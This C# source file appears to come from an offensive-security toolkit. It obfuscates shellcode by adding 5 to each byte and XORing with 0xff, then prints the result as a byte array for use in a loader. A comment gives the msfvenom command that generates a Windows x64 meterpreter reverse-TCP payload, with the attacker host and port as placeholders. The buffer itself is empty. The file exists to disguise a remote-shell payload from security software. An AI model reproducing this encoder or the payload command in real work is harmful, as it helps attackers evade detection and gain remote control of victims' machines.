using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Program
{
    public class XorEncoder
    {
        public static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f csharp
            byte[] buf = new byte[0] { };

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 5 ) ^ 0xff);  // Caeser Shift of 5 with key as 0xff
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            int totalCount = encoded.Length;
            for (int count = 0; count < totalCount; count++)
            {
                byte b = encoded[count];

                if ((count + 1) == totalCount) // Dont append comma for last item
                {
                    hex.AppendFormat("0x{0:x2}", b);
                }
                else
                {
                    hex.AppendFormat("0x{0:x2}, ", b);
                }

                if ((count + 1) % 15 == 0)
                {
                    hex.Append("\n");
                }
            }

            Console.WriteLine($"XOR Payload (KEY : 0xff):");
            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex}\n}};");
        }
    }
}